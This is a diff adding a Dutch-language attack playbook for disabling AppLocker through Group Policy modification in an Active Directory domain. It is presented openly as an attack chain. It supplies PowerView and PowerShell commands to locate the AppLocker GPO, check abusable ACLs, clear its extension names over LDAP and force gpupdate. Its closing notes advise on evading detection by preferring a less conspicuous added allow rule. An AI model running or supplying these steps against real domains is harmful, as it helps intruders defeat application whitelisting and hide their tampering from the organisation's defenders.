@@ -1,0 +1,41 @@
+# AppLocker GPO disable — AppLocker uitschakelen via GPO modificatie
+# Verwijdert AppLocker executable rules door GPO aan te passen
+# Vereist GenericAll/WriteDacl op de GPO die AppLocker configureert
+#
+# === Vereisten ===
+# - GenericAll, GenericWrite, of WriteDacl op de AppLocker GPO
+# - RSAT of PowerView voor GPO manipulatie
+#
+# === Aanvalsketen ===
+# 1. Identificeer welke GPO AppLocker configureert
+# 2. Controleer permissies op die GPO
+# 3. Verwijder of wijzig de AppLocker rules
+# 4. Wacht op GPO refresh of forceer gpupdate
+#
+# === Voorbeelden ===
+
+# Stap 1: Vind de AppLocker GPO
+Get-DomainGPO | Where-Object { $_.DisplayName -match 'AppLocker|Application' } | Select DisplayName, Name, gPCFileSysPath
+
+# Stap 2: Check permissies op de GPO
+Get-DomainGPO -Identity '{GPO-GUID}' | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteDacl' }
+
+# Stap 3a: Via gpmc.msc (GUI)
+# Open Group Policy Management → navigeer naar de GPO → Computer Configuration
+# → Policies → Windows Settings → Security Settings → Application Control Policies
+# → AppLocker → Executable Rules → verwijder restrictieve rules
+
+# Stap 3b: Via PowerShell — verwijder AppLocker XML uit SYSVOL
+$gpoPath = "\\DOMAIN\SYSVOL\DOMAIN\Policies\{GPO-GUID}\Machine\Registry.pol"
+# Backup eerst: copy-item $gpoPath "$gpoPath.bak"
+# Verwijder AppLocker configuratie uit het Registry.pol bestand
+
+# Stap 3c: Via LDAP — reset gPCMachineExtensionNames
+Set-DomainObject -Identity 'CN={GPO-GUID},CN=Policies,CN=System,DC=domain,DC=local' -Clear gPCMachineExtensionNames
+
+# Stap 4: Forceer GPO update
+gpupdate /force
+
+# Noot: Wijzigingen zijn zichtbaar in Event Logs — wees voorzichtig
+# Noot: Maak altijd een backup van de GPO voor herstel
+# Noot: Alternatief: voeg een allow-rule toe ipv rules verwijderen (minder opvallend)
